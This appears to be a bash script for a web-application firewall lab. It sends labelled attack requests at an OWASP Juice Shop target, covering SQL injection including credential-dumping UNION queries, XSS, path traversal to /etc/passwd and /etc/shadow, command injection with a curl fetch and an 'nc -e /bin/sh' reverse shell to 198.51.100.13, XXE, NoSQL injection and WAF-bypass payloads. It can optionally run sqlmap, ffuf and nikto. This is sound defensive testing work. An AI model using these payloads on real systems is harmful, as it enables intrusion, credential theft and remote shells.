#!/usr/bin/env bash
set -uo pipefail
cd "$(dirname "$0")" || exit 1
. ./lib.sh

JSON='Content-Type: application/json'

req SQLI-01 attack GET /rest/products/search -G --data-urlencode "q='))--"
req SQLI-02 attack GET /rest/products/search -G --data-urlencode "q=qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
req SQLI-03 attack GET /rest/products/search -G --data-urlencode "q=qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--"
req SQLI-04 attack POST /rest/user/login -H "$JSON" --data-raw "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
req SQLI-05 attack POST /rest/user/login -H "$JSON" --data-raw "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}"
req SQLI-06 attack POST /rest/user/login -H "$JSON" --data-raw "{\"email\":\"' or 1==1;--\",\"password\":\"x\"}"
req SQLI-07 attack GET /rest/products/search -G --data-urlencode "q=1' AND SLEEP(5)--"

req XSS-01 attack GET /rest/products/search -G --data-urlencode 'q=<iframe src="javascript:alert(`xss`)">'
req XSS-02 attack GET '/rest/track-order/%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E'
req XSS-03 attack GET /rest/products/search -G --data-urlencode 'q=<img src=x onerror=alert(document.cookie)>'
req XSS-04 attack GET /rest/products/search -G --data-urlencode 'q=<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&auto_play=true"></iframe>'

req LFI-01 attack GET '/ftp/coupons_2013.md.bak%2500.md'
req LFI-02 attack GET '/ftp/package.json.bak%2500.md'
req LFI-03 attack GET '/ftp/eastere.gg%2500.md'
req LFI-07 attack GET '/ftp/package.json.bak%25252500.md'
req LFI-04 attack GET '/ftp/x/y/../../etc/passwd' --path-as-is
req LFI-05 attack GET /rest/products/search -G --data-urlencode "q=../../../../etc/passwd"
req LFI-06 attack GET '/assets/public/images/a/b/../../../../etc/shadow' --path-as-is

req RCE-01 attack GET /rest/products/search -G --data-urlencode "q=;cat /etc/passwd"
req RCE-02 attack GET /rest/products/search -G --data-urlencode "q=|| curl http://198.51.100.13/x ||"
req RCE-03 attack GET /rest/products/search -G --data-urlencode 'q=$(whoami)'
req RCE-04 attack GET /rest/products/search -G --data-urlencode 'q=`id`; nc -e /bin/sh 198.51.100.13 4444'

req SSTI-01 attack POST /profile -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=%7B%7B7%2A7%7D%7D'
req SSTI-02 attack POST /profile -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=%23%7B7%2A7%7D'
req CSP-01 attack POST /profile -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=%3Cscript%3Ealert(1)%3C%2Fscript%3E'
req HXSS-01 attack GET /rest/saveLoginIp -H 'X-Forwarded-For: <iframe src="javascript:alert(`xss`)">'
req AXSS-01 attack POST /api/Products -H "$JSON" --data-raw '{"name":"<iframe src=\"javascript:alert(`xss`)\">","description":"lab","price":1}'

printf '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' >"$OUTDIR/xxe.xml"
printf '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><foo>&c;</foo>' >"$OUTDIR/xxedos.xml"
req XXE-01 attack POST /file-upload -F "file=@$OUTDIR/xxe.xml"
req XXE-02 attack POST /file-upload -F "file=@$OUTDIR/xxedos.xml"

req NOSQL-01 attack GET /rest/products/reviews -G --data-urlencode 'id={"$ne":-1}'
req NOSQL-02 attack PATCH /rest/products/reviews -H "$JSON" --data-raw '{"id":{"$ne":-1},"message":"pwned"}'

req LOGIC-01 attack POST /api/Users -H "$JSON" --data-raw '{"email":"adm1n@lab.test","password":"Str0ngLabP4ss","role":"admin"}'
req LOGIC-02 attack GET /rest/user/change-password -G --data-urlencode 'new=slurmCl4ssic' --data-urlencode 'repeat=slurmCl4ssic'
req LOGIC-03 attack GET /api/Users
req LOGIC-04 attack GET '/%23/score-board'

req SCAN-01 attack GET / -A 'sqlmap/1.10.4#stable (https://sqlmap.org)'
req SCAN-02 attack GET / -A 'Fuzz Faster U Fool v2.1.0'
req SCAN-03 attack GET / -A 'Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:map_codes)'
req SCAN-04 attack GET / -A 'Nmap Scripting Engine; https://nmap.org/book/nse.html'
req SCAN-05 attack GET / -A 'masscan/1.3'

req PROTO-01 attack TRACE /
req PROTO-02 attack GET / -H 'Referer: http://198.51.100.13/redirect?url=http://evil.example'
req PROTO-03 attack GET / -H "Cookie: sid=' OR 1=1--"
req PROTO-04 attack GET /rest/products/search -G --data-urlencode "q=<?php system(\$_GET['c']); ?>"

req BYPASS-01 bypass GET /rest/products/search -G --data-urlencode "q=')) OR '1' GLOB '1' --"
req BYPASS-02 bypass GET /rest/products/search -G --data-urlencode "q=')) OR '1' COLLATE NOCASE --"
req BYPASS-03 bypass GET /rest/products/search -G --data-urlencode "q=')) OR name GLOB '*' --"
req BYPASS-04 bypass GET /rest/products/search -G --data-urlencode "q=')) OR '1' MATCH '1' --"
req BYPASS-05 bypass GET /rest/products/search -G --data-urlencode "q=')) OR '1' GLOB zeroblob(1) --"

if [ "${WITH_TOOLS:-0}" = "1" ]; then
    NIKTO_BIN="${NIKTO_BIN:-nikto}"
    if command -v "$NIKTO_BIN" >/dev/null 2>&1; then
        printf '\n-- nikto --\n'
        "$NIKTO_BIN" -h "$WAF" -maxtime 180s \
            -Format json -o "$OUTDIR/nikto-$RUN_ID.json" || true
    fi
    if command -v ffuf >/dev/null 2>&1; then
        printf '\n-- ffuf --\n'
        ffuf -u "$WAF/FUZZ" \
            -w "${WORDLIST:-/usr/share/seclists/Discovery/Web-Content/common.txt}" \
            -mc 200,204,301,302,307,401,403,405,500 -fc 404 \
            -t 10 -rate 40 -timeout 10 -s \
            -H "X-Lab-Run: $RUN_ID" -H 'X-Lab-Case: FFUF' -H 'X-Lab-Class: attack' \
            -o "$OUTDIR/ffuf-$RUN_ID.json" -of json || true
    fi
    if command -v sqlmap >/dev/null 2>&1; then
        printf '\n-- sqlmap --\n'
        sqlmap -u "$WAF/rest/products/search?q=apple" \
            --dbms=sqlite --technique=BEU --level=2 --risk=2 \
            --union-cols=9 --batch --threads=1 --flush-session \
            --headers="X-Lab-Run: $RUN_ID\nX-Lab-Case: SQLMAP\nX-Lab-Class: attack" \
            --output-dir="$OUTDIR/sqlmap-$RUN_ID" || true
    fi
fi

summary "ВРЕДОНОСНЫЙ ТРАФИК"
